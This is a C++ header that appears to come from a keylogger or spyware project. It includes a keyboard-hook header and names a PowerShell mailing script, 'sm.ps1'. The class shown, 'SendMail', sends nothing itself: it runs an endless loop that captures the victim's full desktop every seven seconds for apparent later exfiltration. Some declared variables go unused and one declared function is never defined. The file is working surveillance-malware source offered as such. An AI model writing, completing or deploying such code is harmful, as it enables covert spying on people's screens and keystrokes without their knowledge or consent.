#ifndef _SEND_MAIL_H
#define _SEND_MAIL_H
#include"Screenshots.h"
#include <Windows.h>
#include <chrono>
#include "Keybhook.h"
#define SCRIPT_NAME "sm.ps1"
class SendMail {
public:
    SendMail() = default;
    void SendMailCapture(bool flag);
    void MailHelper(int);
    void ExecuteThreadFunc(void);
    void operator()(int x);
};

void SendMail::MailHelper(int i) {
    Helper::WriteAppLog("In Mail Helper function");
    while (true) {
        SendMail::SendMailCapture(true);
        Sleep(7000);
        //Capturing screen shots after every 7 seconds
    }
    return;
}

void SendMail::SendMailCapture(bool flag = false) {
    if (!flag) {
        return;
    }
    HWND hDesktopWnd = GetDesktopWindow();
    if (hDesktopWnd != INVALID_HANDLE_VALUE) {
        CaptureAnImage(hDesktopWnd);
    }
}
void SendMail::operator()(int x) {
    Helper::WriteAppLog("In ExecuteThreadFunc .. ");
    void* ptr = nullptr;
    HANDLE hMailThread;
    SendMail::MailHelper(3); // passing just a dummy int value. not used in function
}

#endif // !_SEND_MAIL_H

